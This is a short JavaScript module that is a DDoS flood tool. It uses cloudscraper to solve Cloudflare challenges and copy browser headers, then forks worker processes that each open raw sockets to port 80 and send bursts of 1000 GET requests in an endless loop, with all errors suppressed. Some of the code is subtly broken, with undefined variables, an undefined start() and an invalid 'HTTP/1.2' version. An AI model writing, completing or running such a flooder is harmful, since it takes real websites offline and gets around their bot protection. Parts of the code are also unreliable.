const CloudScraper = require("cloudscraper"),
  cluster = require("cluster"),
  url = require("url"),
  net = require("net"),
  sleep = require("await-sleep");

require("events").EventEmitter.defaultMaxListeners = 0;

let headers = "";
let started = 0;

async function OwnThread(target, time, threads) {
  try {
    if (started == 0) {
      startthreads(target, time, threads), (started = 1);
    } else {
    }
  } catch (error) {

  }
  process.on("uncaughtException", function (err) {});
  process.on("unhandledRejection", function (err) {});
}

function getHeaders() {
  return new Promise(function (resolve, reject) {
    CloudScraper.get(
      {
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 10,
      },
      function (error, response) {
        if (error) {
          return start();
        }
        Object.keys(response.request.headers).forEach(function (i, e) {
          if (
            [
              "content-length",
              "Upgrade-Insecure-Requests",
              "Accept-Encoding",
            ].includes(i)
          ) {
            return;
          }
          headers += i + ": " + response.request.headers[i] + "\r\n";
        });
        resolve(headers);
      }
    );
  });
}

function startflood() {
  getHeaders().then(function (result) {
    setInterval(() => {
      pizzaflood(result, target, time, threads);
    });
  });
}

async function startthreads(target, time, threads) {
  if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
      cluster.fork();
    }

    cluster.on("exit", (worker, code, signal) => {
    });
  } else {
      await sleep(1000),
      startflood(target, time, threads);
  }
}

function pizzaflood(headers, target, time, threads) {
  const ip = url.parse(target).host;
  const s = new net.Socket();

  s.connect(80, ip);
  s.setTimeout(1000);

  for (let i = 0; i < 1000; ++i) {
    s.write(`GET ${target} HTTP/1.2\r\n` + headers + "\r\n\r\n");
  }

  s.on("data", function () {
    setTimeout(function () {
      s.destroy();
      return delete s;
    }, 5000);
  });
}

module.exports = {
  OwnThread,
};
